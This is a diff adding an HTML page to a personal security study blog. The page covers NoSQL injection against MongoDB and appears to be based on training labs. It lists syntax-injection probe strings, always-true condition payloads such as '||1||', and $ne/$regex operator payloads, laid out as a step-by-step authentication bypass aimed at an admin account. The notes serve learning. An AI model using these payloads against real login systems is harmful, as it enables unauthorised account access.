@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Mi Blog</title>
+  <link rel="stylesheet" href="file:///Users/b0ydc/Documents/CYBER/SITE/css/styles.css">
+</head>
+<body>
+  <header>
+    <h4 align="right">@b0ydC</h4>
+  </header>
+
+  <main>
+    <article>
+     
+<h2>1. CONTEXT INFORMATION</h2>  
+
+<code>
+
+NoSQL databases are different than the normal SQL databases. The structure is different so the way to query the DB will differ. 
+The structure of NoSQL DB is [key:pair] structure.<br><br>
+
+FUZZING is the most common attack for this !!<br><br>
+
+SAMPLE: https://machetevault.com/product/lookup?category=FUZZ<br><br>
+
+- Possible DBS: mongoDB, redis, couch DB & more.<br><br>
+
+<u>Two types:</u> <br><br>
+  
+1. Syntax Injection: It is when you can break the query.<br>
+2. Operator Injection: It is when you can use operators to manipulate the queries.
+
+</code>
+
+<h2>2. GENERAL INFORMATION</h2>  
+
+<code>
+
+NOTES:<br><br>
+1. Inspection of requests is needed. [burpsuite]<br>
+2. Techniques used for SQL Injection can be used, it will differ the parameters and more but logic can be adapted.<br>
+3. Use URL/JSON encoding when needed.<br><br>
+  
+C1: '<br><br>
+C2: '+'<br><br>
+
+Simple quote (') is used to determine which characters are interpreted as syntax, it is important to check requests/response before 
+and after and compare it. In order to escape queries the slash can be used. (&bsol;&rpar;<br><br>
+
+SAMPLE: this.car == '&bsol;&apos;'<br><br>
+
+<u>MONGO DB</u><br><br>
+
+C1: &apos;&quot;&grave;&lcub;&semi;&dollar;Foo&rcub;&dollar;Foo &bsol;xYZ<br><br>
+
+<u>CONDITIONAL BEHAVIOR</u><br><br>
+
+NOTE:<br> <br>
+- inspection of requests/response is needed. [burpsuite]<br><br>
+
+C1: FALSE ' && 0 && 'x<br><br>
+C2: TRUE ' && 1 && 'x<br><br>
+
+<u>OVERRIDING CONDITIONS</u><br><br>
+
+NOTE: this method is always TRUE.<br><br>
+  
+C1: '||1||'
+
+</code>          
+
+<h2>3. NoSQL OPERATORS</h2>  
+
+<code>
+
+NOTES:<br><br>
+- Requests inspection is needed.<br>
+- It is normally as key:pair values.</code><br><br>
+
+<u>BYPASS AUTHENTICATION</u><br><br>
+
+<u>MONGO DB</u><br><br>
+
+<code>
+
+There's a technique to use two operators that can help to discover if operators are allowed and also those can lead to authentication 
+bypass.<br><br>
+
+Request login sample:<br><br>
+
+{<br>
+"username":"wiener",<br>
+"password":"peter"<br>
+}<br><br>
+
+OPERATORS:<br><br>
+
+{"$ne":""} | selects the documents where the value of the specified field is not equal to the specified value. This includes 
+documents that do not contain the specified field.<br><br>
+
+{"$regex":""} | provides regular expression capabilities for pattern matching strings in queries.<br><br>
+
+TECHNIQUE: Case scenario with a valid user to attempt!!<br><br>
+
+As it is to bypass authentication methods, normally it is attempted on input fields and also, probably exist some users as reference 
+to use it.<br><br>
+
+<u>First Test:</u> username:{"$ne":""} with valid password. it is bypassing ?<br><br>
+
+<u>Second Test:</u> username:{"$regex":"wien.*"} with valid password. it is bypassing ?<br><br>
+
+NOTE:<br> <br>
+- "wien.*" >> it is a valid user with a wilcard to retrieve all related to that pattern. <br><br>
+
+<u>Third Test:</u> username as {"$ne":""} with password as {"$ne":""}. it is bypassing ?<br><br>
+
+NOTE:<br> <br>
+- if you get, &lt;p class=is-warning>Query returned unexpected number of records&lt;&sol;p> It means, that 
+more than one user has been selected. So apply fourth test.<br><br>
+
+<u>Fourth Test:</u> username as {"$regex":"admin.*"} with password as {"$ne":""}. it is bypassing ?<br><br>
+
+NOTE:<br> <br>
+- It is trying to bypass the user "admin" with any value as password.
+
+</code>
+    </article>
+  </main>
+</body>
+</html>
